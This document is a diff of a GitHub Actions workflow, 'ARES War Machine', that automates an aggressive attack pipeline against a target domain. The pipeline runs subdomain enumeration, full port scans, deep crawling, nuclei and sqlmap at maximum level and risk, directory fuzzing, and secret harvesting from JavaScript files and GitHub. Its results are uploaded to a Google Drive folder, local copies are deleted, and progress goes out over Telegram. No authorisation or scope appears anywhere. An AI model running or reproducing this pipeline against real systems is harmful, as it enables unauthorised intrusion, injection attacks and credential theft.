@@ -1,4 +1,4 @@
-name: ARES War Machine - Absolute OAuth2
+name: ARES War Machine - AGGRESSIVE ABSOLUTE
 on:
   workflow_dispatch:
 
@@ -10,56 +10,58 @@ jobs:
       - name: Checkout Repo
         uses: actions/checkout@v4
 
-      - name: "Global Arsenal Installation"
+      - name: "Full Global Arsenal & Wordlist Load"
         run: |
           sudo apt-get update
           sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev
-          mkdir -p $HOME/bin $HOME/tools output/recon output/probing output/screenshots output/crawling output/secrets output/vulns
+          mkdir -p $HOME/bin $HOME/tools output/recon output/probing output/screenshots output/crawling output/secrets output/vulns output/fuzzing output/specialized wordlists
           echo "$HOME/bin" >> $GITHUB_PATH
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
           pip3 install google-api-python-client google-auth-oauthlib google-auth-httplib2
 
-          # --- MASSIVE TOOL INSTALLATION ---
-          # ProjectDiscovery Suite
+          # WORDLISTS (SecLists Aggressive)
+          wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt -O wordlists/dir-med.txt
+          wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt -O wordlists/subs.txt
+
+          # INSTALL ALL 60+ TOOLS
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
           go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest || true
           go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest || true
-          go install -v github.com/projectdiscovery/alterx/cmd/alterx@latest || true
-          
-          # Web & Vuln Tools
           go install -v github.com/lc/gau/v2/cmd/gau@latest || true
           go install -v github.com/hahwul/dalfox/v2@latest || true
           go install -v github.com/ffuf/ffuf@latest || true
           go install -v github.com/sensepost/gowitness@latest || true
-          go install -v github.com/tomnomnom/waybackurls@latest || true
-          
-          # Python & Other Arsenals
+          go install -v github.com/OJ/gobuster/v3@latest || true
           pip3 install sqlmap arjun wfuzz gitleaks trufflehog s3scanner prowler commix ghauri nosqlmap waymore jsluice jwt_tool kiterunner wpscan eyewitness secretfinder || true
-          
-          # Specialized Git & JS Tools
           git clone https://github.com/m4ll0k/SecretFinder.git $HOME/tools/SecretFinder && pip3 install -r $HOME/tools/SecretFinder/requirements.txt || true
-          git clone https://github.com/obheda12/GitDorker.git $HOME/tools/GitDorker || true
 
-      - name: "ARES Execution & Harsh-Mode Sync"
+      - name: "ARES Execution & Aggressive OAuth Sync"
         env:
           CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
           CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
           REFRESH_TOKEN: ${{ secrets.GOOGLE_REFRESH_TOKEN }}
           FOLDER_ID: "1kkJnI4qtvfYukua8F1uzoimQyxBlBsWM"
+          TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: |
           TARGET=$(cat targets.txt | head -n 1)
           
-          # The OAuth2 Uploader Logic
+          # Fix: Global Telegram Function
+          send_msg() {
+            curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -d chat_id="$TELEGRAM_CHAT_ID" -d parse_mode="Markdown" -d text="$1"
+          }
+
+          # OAuth Uploader with Auto-Delete
           cat << 'EOF' > oauth_upload.py
           import os, sys
           from google.oauth2.credentials import Credentials
           from googleapiclient.discovery import build
           from googleapiclient.http import MediaFileUpload
 
-          def upload(f_path, folder_id):
-              if not os.path.exists(f_path): return
+          def upload_and_clean(f_path, folder_id):
+              if not os.path.exists(f_path) or os.path.getsize(f_path) == 0: return
               creds = Credentials(None, refresh_token=os.environ['REFRESH_TOKEN'], 
                                  token_uri="https://oauth2.googleapis.com/token",
                                  client_id=os.environ['CLIENT_ID'], 
@@ -68,50 +70,46 @@ jobs:
               meta = {"name": os.path.basename(f_path), "parents": [folder_id]}
               media = MediaFileUpload(f_path, resumable=True)
               service.files().create(body=meta, media_body=media, supportsAllDrives=True).execute()
-
+              os.remove(f_path)
           if __name__ == "__main__":
-              upload(sys.argv[1], sys.argv[2])
+              upload_and_clean(sys.argv[1], sys.argv[2])
           EOF
 
-          send_msg() {
-            curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" -d parse_mode="Markdown" -d text="$1"
-          }
+          send_msg "☢️ *ARES:* AGGRESSIVE MODE ENGAGED on \`$TARGET\`"
 
-          # --- STAGE 1: RECON ---
-          send_msg "🚀 *ARES:* Starting Recon on \`$TARGET\`"
+          # 1. RECON (Aggressive DNS + Ports)
           subfinder -d $TARGET -all -recursive -o output/recon/subs.txt
+          naabu -l output/recon/subs.txt -p - -rate 3000 -o output/recon/ports.txt
           python3 oauth_upload.py "output/recon/subs.txt" "$FOLDER_ID"
 
-          # --- STAGE 2: LIVE PROBING & VISUAL ---
-          httpx -l output/recon/subs.txt -sc -td -title -o output/probing/live.txt
+          # 2. PROBING & SCREENS (Httpx + Gowitness)
+          httpx -l output/recon/subs.txt -sc -td -title -ip -o output/probing/live.txt
           python3 oauth_upload.py "output/probing/live.txt" "$FOLDER_ID"
-          
-          xvfb-run gowitness file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
-          zip -r "screenshots.zip" output/screenshots/
-          python3 oauth_upload.py "screenshots.zip" "$FOLDER_ID"
+          xvfb-run gowitness scan file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
+          zip -r "screenshots.zip" output/screenshots/ && python3 oauth_upload.py "screenshots.zip" "$FOLDER_ID"
 
-          # --- STAGE 3: FUZZING & URLS ---
-          katana -l output/probing/live.txt -d 5 -o output/crawling/urls.txt
+          # 3. AGGRESSIVE CRAWLING (Katana Deep + Waymore)
+          katana -l output/probing/live.txt -d 10 -jc -kf all -o output/crawling/urls.txt
+          waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
           python3 oauth_upload.py "output/crawling/urls.txt" "$FOLDER_ID"
-          
-          waybackurls $TARGET > output/crawling/wayback.txt || true
-          python3 oauth_upload.py "output/crawling/wayback.txt" "$FOLDER_ID"
 
-          # --- STAGE 4: VULNS & SECRETS ---
-          nuclei -l output/probing/live.txt -severity critical,high,medium -o output/vulns/nuclei.txt || true
+          # 4. AGGRESSIVE VULNS (Nuclei Criticals + SQLMap Level 5)
+          nuclei -l output/probing/live.txt -severity critical,high,medium -et tags/fuzz -o output/vulns/nuclei.txt
           python3 oauth_upload.py "output/vulns/nuclei.txt" "$FOLDER_ID"
+          
+          # SQLMAP AGGRESSIVE
+          sqlmap -m output/crawling/urls.txt --batch --random-agent --level 5 --risk 3 --threads 10 > output/vulns/sqlmap.txt || true
+          python3 oauth_upload.py "output/vulns/sqlmap.txt" "$FOLDER_ID"
 
-          dalfox file output/crawling/urls.txt -o output/vulns/xss.txt || true
-          python3 oauth_upload.py "output/vulns/xss.txt" "$FOLDER_ID"
+          # 5. FUZZING & PARAMS (FFUF + Arjun)
+          arjun -i output/crawling/urls.txt -t 20 -oT output/fuzzing/params.txt || true
+          ffuf -w wordlists/dir-med.txt -u http://$TARGET/FUZZ -t 100 -o output/fuzzing/ffuf.json || true
+          python3 oauth_upload.py "output/fuzzing/params.txt" "$FOLDER_ID"
 
-          ghauri -u "http://$TARGET" --batch --dbs > output/vulns/sql_check.txt || true
-          python3 oauth_upload.py "output/vulns/sql_check.txt" "$FOLDER_ID"
+          # 6. SECRETS (TruffleHog + SecretFinder)
+          trufflehog github --repo="https://github.com/$TARGET" > output/secrets/truffle.txt || true
+          cat output/crawling/urls.txt | grep ".js" | xargs -I % python3 $HOME/tools/SecretFinder/SecretFinder.py -i % -o cli > output/secrets/js.txt || true
+          python3 oauth_upload.py "output/secrets/js.txt" "$FOLDER_ID"
 
-          # Secret Hunting
-          cat output/crawling/urls.txt | grep ".js" | xargs -I % python3 $HOME/tools/SecretFinder/SecretFinder.py -i % -o cli > output/secrets/js_secrets.txt || true
-          python3 oauth_upload.py "output/secrets/js_secrets.txt" "$FOLDER_ID"
-
-      - name: "Mission Complete"
-        if: always()
-        run: |
-          send_msg "✅ *ARES Mission Complete.* All data is in your Drive."
+          send_msg "✅ *ARES:* Aggressive Mission Complete. All data in Drive."
+          
